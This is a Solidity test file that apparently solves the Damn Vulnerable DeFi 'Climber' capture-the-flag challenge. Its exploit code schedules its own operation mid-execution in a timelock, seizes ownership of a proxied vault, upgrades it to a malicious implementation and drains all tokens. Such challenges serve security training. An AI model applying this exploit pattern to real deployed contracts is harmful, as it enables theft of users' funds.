// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import {Utilities} from "../utils/Utilities.sol";
import {BaseTest} from "../BaseTest.sol";

import "../../src/DamnValuableToken.sol";
import "../../src/climber/ClimberTimelock.sol";
import "../../src/climber/ClimberVault.sol";

import "openzeppelin-contracts/proxy/ERC1967/ERC1967Proxy.sol";
import "openzeppelin-contracts/token/ERC20/IERC20.sol";

contract ClimberTest is BaseTest {
    uint256 constant VAULT_TOKEN_BALANCE = 10_000_000 ether;

    address payable attacker;
    address payable deployer;
    address payable proposer;
    address payable sweeper;

    ClimberVault vault;
    ClimberTimelock vaultTimelock;
    DamnValuableToken token;

    constructor() {
        string[] memory labels = new string[](4);
        labels[0] = "Deployer";
        labels[1] = "Proposer";
        labels[2] = "Sweeper";
        labels[3] = "Attacker";

        preSetup(4, labels);
    }

    function setUp() public override {
        super.setUp();

        deployer = users[0];
        proposer = users[1];
        sweeper = users[2];
        attacker = users[3];

        deal(attacker, 0.1 ether);
        assertEq(attacker.balance, 0.1 ether);

        // Deploy the vault behind a proxy using the UUPS pattern,
        // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
        vm.startPrank(deployer);
        ClimberVault vaultImplementation = new ClimberVault();
        vm.label(address(vaultImplementation), "ClimberVault Implementation");

        bytes memory data = abi.encodeWithSignature(
            "initialize(address,address,address)",
            deployer,
            proposer,
            sweeper
        );
        ERC1967Proxy vaultProxy = new ERC1967Proxy(
            address(vaultImplementation),
            data
        );
        vault = ClimberVault(address(vaultProxy));
        vm.label(address(vault), "ClimberVault Proxy");

        assertEq(vault.getSweeper(), sweeper);
        assertEq(vault.getLastWithdrawalTimestamp(), block.timestamp);
        assertEq(vault.owner() == address(0), false);
        assertEq(vault.owner() == deployer, false);

        // Instantiate timelock
        vaultTimelock = ClimberTimelock(payable(vault.owner()));
        vm.label(address(vaultTimelock), "ClimberTimelock");

        assertEq(vaultTimelock.hasRole(PROPOSER_ROLE, proposer), true);
        assertEq(vaultTimelock.hasRole(ADMIN_ROLE, deployer), true);

        // Deploy token and transfer initial token balance to the vault
        token = new DamnValuableToken();
        token.transfer(address(vault), VAULT_TOKEN_BALANCE);

        vm.stopPrank();
    }

    function test_ExploitClimberTest() public {
        runTest();
    }

    function exploit() internal override {
        Middleman middleman = new Middleman();

        // prepare the operation data composed by 3 different actions
        bytes32 salt = keccak256("attack proposal");
        address[] memory targets = new address[](4);
        uint256[] memory values = new uint256[](4);
        bytes[] memory dataElements = new bytes[](4);
        // updateDelay(uint64 newDelay)
        // set the attacker as the owner of the vault as the first operation
        targets[0] = address(vaultTimelock);
        values[0] = 0;
        dataElements[0] = abi.encodeWithSignature("updateDelay(uint64)", 0);
        // set the attacker as the owner of the vault as the first operation
        targets[1] = address(vault);
        values[1] = 0;
        dataElements[1] = abi.encodeWithSignature(
            "transferOwnership(address)",
            attacker
        );

        // grant the PROPOSER role to the middle man contract will schedule the operation
        targets[2] = address(vaultTimelock);
        values[2] = 0;
        dataElements[2] = abi.encodeWithSignature(
            "grantRole(bytes32,address)",
            PROPOSER_ROLE,
            address(middleman)
        );

        // call the external middleman contract to schedule the operation with the needed data
        targets[3] = address(middleman);
        values[3] = 0;
        dataElements[3] = abi.encodeWithSignature(
            "scheduleOperation(address,address,address,bytes32)",
            attacker,
            address(vault),
            address(vaultTimelock),
            salt
        );

        // anyone can call the `execute` function, there's no auth check over there
        vm.prank(attacker);
        vaultTimelock.execute(targets, values, dataElements, salt);

        // at this point `attacker` is the owner of the ClimberVault and he can do what ever he wants
        // For example we could upgrade to a new implementation that allow us to do whatever we want
        // Deploy the new implementation
        vm.startPrank(attacker);

        PawnedClimberVault newVaultImpl = new PawnedClimberVault();

        // Upgrade the proxy implementation to the new vault
        vault.upgradeTo(address(newVaultImpl));

        // withdraw all the funds
        PawnedClimberVault(address(vault)).withdrawAll(address(token));
        vm.stopPrank();
    }

    // function buildRequest()

    function success() internal override {
        /** SUCCESS CONDITIONS */

        assertEq(token.balanceOf(address(vault)), 0);
        assertEq(token.balanceOf(attacker), VAULT_TOKEN_BALANCE);
    }
}

contract Middleman {
    function scheduleOperation(
        address attacker,
        address vaultAddress,
        address vaultTimelockAddress,
        bytes32 salt
    ) external {
        // Recreate the scheduled operation from the Middle man contract and call the vault
        // to schedule it before it will check (inside the `execute` function) if the operation has been scheduled
        // This is leveraging the existing re-entrancy exploit in `execute`
        ClimberTimelock vaultTimelock = ClimberTimelock(
            payable(vaultTimelockAddress)
        );

        address[] memory targets = new address[](4);
        uint256[] memory values = new uint256[](4);
        bytes[] memory dataElements = new bytes[](4);

        targets[0] = vaultTimelockAddress;
        values[0] = 0;
        dataElements[0] = abi.encodeWithSignature("updateDelay(uint64)", 0);
        // set the attacker as the owner
        targets[1] = vaultAddress;
        values[1] = 0;
        dataElements[1] = abi.encodeWithSignature(
            "transferOwnership(address)",
            attacker
        );

        // set the attacker as the owner
        targets[2] = vaultTimelockAddress;
        values[2] = 0;
        dataElements[2] = abi.encodeWithSignature(
            "grantRole(bytes32,address)",
            PROPOSER_ROLE,
            address(this)
        );

        // create the proposal
        targets[3] = address(this);
        values[3] = 0;
        dataElements[3] = abi.encodeWithSignature(
            "scheduleOperation(address,address,address,bytes32)",
            attacker,
            vaultAddress,
            vaultTimelockAddress,
            salt
        );

        vaultTimelock.schedule(targets, values, dataElements, salt);
    }
}

contract PawnedClimberVault is ClimberVault {
    /// @custom:oz-upgrades-unsafe-allow constructor
    // constructor() initializer {}

    function withdrawAll(address tokenAddress) external onlyOwner {
        // withdraw the whole token balance from the contract
        IERC20 token = IERC20(tokenAddress);
        require(
            token.transfer(msg.sender, token.balanceOf(address(this))),
            "Transfer failed"
        );
    }
}
